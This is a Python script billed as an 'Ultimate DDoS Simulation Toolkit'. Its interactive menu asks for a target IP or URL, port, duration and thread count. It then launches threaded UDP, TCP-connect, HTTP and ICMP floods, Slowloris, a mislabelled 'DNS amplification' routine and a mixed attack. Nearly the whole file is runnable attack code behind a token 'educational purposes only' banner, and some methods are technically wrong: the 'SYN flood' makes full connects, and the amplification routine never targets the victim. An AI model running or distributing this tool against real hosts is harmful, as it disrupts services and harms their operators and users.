#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
██████╗ ██████╗  ██████╗ ███████╗███████╗██████╗ 
██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
██║  ██║██║  ██║██║   ██║███████╗█████╗  ██████╔╝
██║  ██║██║  ██║██║   ██║╚════██║██╔══╝  ██╔══██╗
██████╔╝██████╔╝╚██████╔╝███████║███████╗██║  ██║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
            Ultimate DDoS Simulation Toolkit Dev By Brightz t.me/EagleSpye
"""

import threading
import socket
import time
import random
import os
import sys
import argparse
from urllib.parse import urlparse

class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    banner = f"""{colors.RED}
    ╔══════════════════════════════════════════════════════════════╗
    ║{colors.CYAN}          ██████╗ ██████╗  ██████╗ ███████╗███████╗██████╗ {colors.RED}         ║
    ║{colors.CYAN}          ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗{colors.RED}         ║
    ║{colors.CYAN}          ██║  ██║██║  ██║██║   ██║███████╗█████╗  ██████╔╝{colors.RED}         ║
    ║{colors.CYAN}          ██║  ██║██║  ██║██║   ██║╚════██║██╔══╝  ██╔══██╗{colors.RED}         ║
    ║{colors.CYAN}          ██████╔╝██████╔╝╚██████╔╝███████║███████╗██║  ██║{colors.RED}         ║
    ║{colors.CYAN}          ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝{colors.RED}         ║
    ║{colors.WHITE}               Ultimate DDoS  Toolkit By Brightz T.me/EagleSpye{colors.RED}                       ║
    ║{colors.YELLOW}         [!] For Educational and Research Purposes Only {colors.RED}         ║
    ╚══════════════════════════════════════════════════════════════╝
    {colors.END}
    """
    print(banner)

def show_menu():
    menu = f"""
    {colors.BOLD}{colors.WHITE}╔══════════════════════════════════════════════════════════════╗{colors.END}
    {colors.BOLD}{colors.WHITE}║{colors.CYAN}                     ATTACK METHODS{colors.WHITE}                       ║{colors.END}
    {colors.BOLD}{colors.WHITE}╠══════════════════════════════════════════════════════════════╣{colors.END}
    {colors.BOLD}{colors.WHITE}║ {colors.GREEN}[1]{colors.END} UDP Flood         {colors.GREEN}[2]{colors.END} TCP SYN Flood      {colors.GREEN}[3]{colors.END} HTTP Flood {colors.WHITE}     ║{colors.END}
    {colors.BOLD}{colors.WHITE}║ {colors.GREEN}[4]{colors.END} ICMP Flood        {colors.GREEN}[5]{colors.END} Slowloris          {colors.GREEN}[6]{colors.END} DNS Amplification {colors.WHITE}║{colors.END}
    {colors.BOLD}{colors.WHITE}║ {colors.GREEN}[7]{colors.END} Mixed Attack      {colors.GREEN}[8]{colors.END} Exit               {colors.WHITE}                 ║{colors.END}
    {colors.BOLD}{colors.WHITE}╚══════════════════════════════════════════════════════════════╝{colors.END}
    """
    print(menu)

def get_user_choice():
    try:
        choice = int(input(f"\n    {colors.YELLOW}[?] Select attack method (1-8): {colors.END}"))
        return choice
    except ValueError:
        return 0

def get_target_info():
    target = input(f"    {colors.YELLOW}[?] Enter target IP/URL: {colors.END}").strip()
    port = input(f"    {colors.YELLOW}[?] Enter target port (default 80): {colors.END}").strip()
    port = int(port) if port.isdigit() else 80
    duration = input(f"    {colors.YELLOW}[?] Enter attack duration in seconds: {colors.END}").strip()
    duration = int(duration) if duration.isdigit() else 60
    threads = input(f"    {colors.YELLOW}[?] Enter number of threads (default 100): {colors.END}").strip()
    threads = int(threads) if threads.isdigit() else 100
    return target, port, duration, threads

def udp_flood(target, port, duration, threads):
    print(f"{colors.RED}\n[!] Starting UDP Flood attack on {target}:{port}{colors.END}")
    
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(1024), (target, port))
                s.close()
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=attack).start()

def tcp_syn_flood(target, port, duration, threads):
    print(f"{colors.RED}\n[!] Starting TCP SYN Flood attack on {target}:{port}{colors.END}")
    
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.close()
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=attack).start()

def http_flood(target, port, duration, threads):
    print(f"{colors.RED}\n[!] Starting HTTP Flood attack on {target}:{port}{colors.END}")
    
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode(), (target, port))
                s.close()
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=attack).start()

def icmp_flood(target, port, duration, threads):
    print(f"{colors.RED}\n[!] Starting ICMP Flood attack on {target}{colors.END}")
    
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                s.sendto(random._urandom(64), (target, 0))
                s.close()
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=attack).start()

def slowloris(target, port, duration, threads):
    print(f"{colors.RED}\n[!] Starting Slowloris attack on {target}:{port}{colors.END}")
    
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                while time.time() < end_time:
                    s.send("X-a: b\r\n".encode())
                    time.sleep(10)
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=attack).start()

def dns_amplification(target, port, duration, threads):
    print(f"{colors.RED}\n[!] Starting DNS Amplification attack on {target}{colors.END}")
    
    # List of open DNS resolvers (for educational purposes only)
    dns_servers = [
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
        "9.9.9.9", "149.112.112.112", "64.6.64.6", "64.6.65.6"
    ]
    
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                dns_server = random.choice(dns_servers)
                dns_query = bytearray(random.getrandbits(8) for _ in range(64))
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(dns_query, (dns_server, 53))
                s.close()
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=attack).start()

def mixed_attack(target, port, duration, threads):
    print(f"{colors.RED}\n[!] Starting Mixed Attack on {target}:{port}{colors.END}")
    
    def udp_attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(1024), (target, port))
                s.close()
            except:
                pass
    
    def tcp_attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.close()
            except:
                pass
    
    for _ in range(threads // 2):
        threading.Thread(target=udp_attack).start()
        threading.Thread(target=tcp_attack).start()

def main():
    clear_screen()
    show_banner()
    
    while True:
        show_menu()
        choice = get_user_choice()
        
        if choice == 8:
            print(f"\n{colors.GREEN}[+] Exiting DDoser. Goodbye!{colors.END}\n")
            sys.exit(0)
        
        if 1 <= choice <= 7:
            target, port, duration, threads = get_target_info()
            
            if choice == 1:
                udp_flood(target, port, duration, threads)
            elif choice == 2:
                tcp_syn_flood(target, port, duration, threads)
            elif choice == 3:
                http_flood(target, port, duration, threads)
            elif choice == 4:
                icmp_flood(target, port, duration, threads)
            elif choice == 5:
                slowloris(target, port, duration, threads)
            elif choice == 6:
                dns_amplification(target, port, duration, threads)
            elif choice == 7:
                mixed_attack(target, port, duration, threads)
            
            print(f"{colors.YELLOW}\n[!] Attack completed. Returning to main menu...{colors.END}")
            time.sleep(2)
            clear_screen()
            show_banner()
        else:
            print(f"{colors.RED}\n[!] Invalid choice. Please select a valid option.{colors.END}")
            time.sleep(1)
            clear_screen()
            show_banner()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{colors.RED}[!] Program terminated by user.{colors.END}")
        sys.exit(0)